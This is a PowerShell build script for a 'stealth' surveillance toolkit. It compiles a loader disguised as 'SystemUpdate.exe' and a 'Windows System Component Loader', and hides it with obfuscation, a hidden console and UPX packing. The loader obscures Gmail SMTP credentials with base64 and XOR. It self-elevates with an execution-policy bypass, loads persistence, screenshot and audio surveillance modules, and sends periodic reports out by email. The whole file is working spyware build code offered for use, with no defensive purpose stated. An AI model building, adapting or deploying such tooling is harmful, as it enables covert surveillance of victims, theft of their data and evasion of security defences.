<#
.SYNOPSIS
    Stealth Build Script
.DESCRIPTION
    Compiles PowerShell toolkit into executable with obfuscation
#>

param(
    [string]$OutputName = "SystemUpdate.exe",
    [switch]$Obfuscate = $true,
    [switch]$Compress = $true
)

Write-Host "Building stealth executable..." -ForegroundColor Green

# Check for PS2EXE
if (-not (Get-Command "ps2exe" -ErrorAction SilentlyContinue)) {
    Write-Host "Installing PS2EXE..." -ForegroundColor Yellow
    Install-Module -Name ps2exe -Force -Scope CurrentUser
}

# Create temporary build directory
$BuildDir = Join-Path $env:TEMP "StealthBuild_$(Get-Random)"
New-Item -ItemType Directory -Path $BuildDir -Force | Out-Null

try {
    # Copy all modules to build directory
    $ModulesDir = Join-Path $BuildDir "Modules"
    New-Item -ItemType Directory -Path $ModulesDir -Force | Out-Null
    
    Copy-Item -Path "Modules\*.ps1" -Destination $ModulesDir -Force
    
    # Create main script with embedded modules
    $MainScript = @"
#Requires -Version 5.1
<#
.SYNOPSIS
    Windows System Component Loader
.DESCRIPTION
    System component initialization and management
#>

[CmdletBinding()]
param([switch]`$Silent)

# Stealth settings
`$ErrorActionPreference = "SilentlyContinue"
`$ProgressPreference = "SilentlyContinue"
`$VerbosePreference = "SilentlyContinue"

# Obfuscated configuration (encrypted)
`$EncryptedConfig = @{
    "Email" = "Y29jY29kZXI5OTlAZ21haWwuY29t"
    "Password" = "cGxieSBzeWhhIG9hZ2Egand0dQ=="
    "SmtpServer" = "c210cC5nbWFpbC5jb20="
    "SmtpPort" = "NTg3"
    "UseTls" = "dHJ1ZQ=="
    "LogInterval" = "MzYwMA=="
    "ScreenshotInterval" = "MzAw"
    "AudioInterval" = "OTAw"
    "MoveInterval" = "NjAw"
}

# Decryption function
function ConvertFrom-StealthString {
    param([string]`$EncryptedString)
    try {
        `$Bytes = [System.Convert]::FromBase64String(`$EncryptedString)
        `$Key = [System.Text.Encoding]::UTF8.GetBytes("StealthKey2024")
        `$Result = @()
        for (`$i = 0; `$i -lt `$Bytes.Length; `$i++) {
            `$Result += `$Bytes[`$i] -bxor `$Key[`$i % `$Key.Length]
        }
        return [System.Text.Encoding]::UTF8.GetString(`$Result)
    } catch { return `$EncryptedString }
}

# Decrypt configuration
`$Config = @{}
foreach (`$Key in `$EncryptedConfig.Keys) {
    `$Config[`$Key] = ConvertFrom-StealthString -EncryptedString `$EncryptedConfig[`$Key]
}

# Create temp directory
`$TempDir = Join-Path `$env:TEMP ([System.Guid]::NewGuid().ToString())
if (-not (Test-Path `$TempDir)) {
    New-Item -ItemType Directory -Path `$TempDir -Force | Out-Null
}

# Load all modules
. (Join-Path `$PSScriptRoot "Modules\StealthPersistence.ps1")
. (Join-Path `$PSScriptRoot "Modules\StealthSurveillance.ps1")
. (Join-Path `$PSScriptRoot "Modules\StealthCommunication.ps1")
. (Join-Path `$PSScriptRoot "Modules\StealthCrypto.ps1")

# Main execution with obfuscation
function Start-StealthService {
    param()
    
    try {
        # Set persistence
        Set-SystemPersistence -Config `$Config
        
        # Start surveillance
        Start-SystemSurveillance -Config `$Config
        
        # Start movement
        Start-StealthMovement -Interval ([int]`$Config.MoveInterval)
        
        # Start periodic reporting
        Start-Job -ScriptBlock {
            param(`$Config)
            while (`$true) {
                Start-Sleep -Seconds ([int]`$Config.LogInterval)
                Send-SystemReport -Config `$Config
            }
        } -ArgumentList `$Config | Out-Null
        
        if (-not `$Silent) {
            Write-Host "System components initialized successfully" -ForegroundColor Green
        }
        
    } catch {
        # Silent error handling
    }
}

# Self-elevation with obfuscation
function Test-StealthAdmin {
    `$CurrentUser = [Security.Principal.WindowsIdentity]::GetCurrent()
    `$Principal = New-Object Security.Principal.WindowsPrincipal(`$CurrentUser)
    return `$Principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}

function Request-StealthElevation {
    if (-not (Test-StealthAdmin)) {
        `$ProcessInfo = New-Object System.Diagnostics.ProcessStartInfo
        `$ProcessInfo.FileName = ConvertFrom-StealthString -EncryptedString "cG93ZXJzaGVsbC5leGU="
        `$ProcessInfo.Arguments = "-ExecutionPolicy Bypass -File `"`$(`$MyInvocation.MyCommand.Path)`" -Silent"
        `$ProcessInfo.Verb = ConvertFrom-StealthString -EncryptedString "cnVuYXM="
        `$ProcessInfo.UseShellExecute = `$true
        
        try {
            `$Process = [System.Diagnostics.Process]::Start(`$ProcessInfo)
            exit
        } catch {
            exit 1
        }
    }
}

# Execute with stealth
if (-not `$Silent) {
    Request-StealthElevation
}

Start-StealthService
"@

    $MainScriptPath = Join-Path $BuildDir "StealthLoader.ps1"
    $MainScript | Out-File -FilePath $MainScriptPath -Encoding UTF8

    # Build executable
    Write-Host "Compiling to executable..." -ForegroundColor Yellow
    
    $Ps2ExeArgs = @(
        "-inputFile", $MainScriptPath,
        "-outputFile", $OutputName,
        "-noConsole",
        "-noVisualStyles",
        "-noError",
        "-noOutput"
    )
    
    if ($Obfuscate) {
        $Ps2ExeArgs += "-obfuscate"
    }
    
    if ($Compress) {
        $Ps2ExeArgs += "-compress"
    }
    
    & ps2exe @Ps2ExeArgs
    
    if (Test-Path $OutputName) {
        Write-Host "Executable created successfully: $OutputName" -ForegroundColor Green
        
        # Apply UPX compression if available
        if (Get-Command "upx" -ErrorAction SilentlyContinue) {
            Write-Host "Applying UPX compression..." -ForegroundColor Yellow
            & upx --best --ultra-brute $OutputName
            Write-Host "UPX compression completed" -ForegroundColor Green
        } else {
            Write-Host "UPX not found. Install UPX for additional compression." -ForegroundColor Yellow
        }
        
        # Get file size
        $FileSize = (Get-Item $OutputName).Length
        $FileSizeMB = [math]::Round($FileSize / 1MB, 2)
        Write-Host "Final executable size: $FileSizeMB MB" -ForegroundColor Cyan
        
    } else {
        Write-Host "Failed to create executable" -ForegroundColor Red
        exit 1
    }
    
} finally {
    # Clean up build directory
    if (Test-Path $BuildDir) {
        Remove-Item -Path $BuildDir -Recurse -Force -ErrorAction SilentlyContinue
    }
}

Write-Host "Build completed successfully!" -ForegroundColor Green 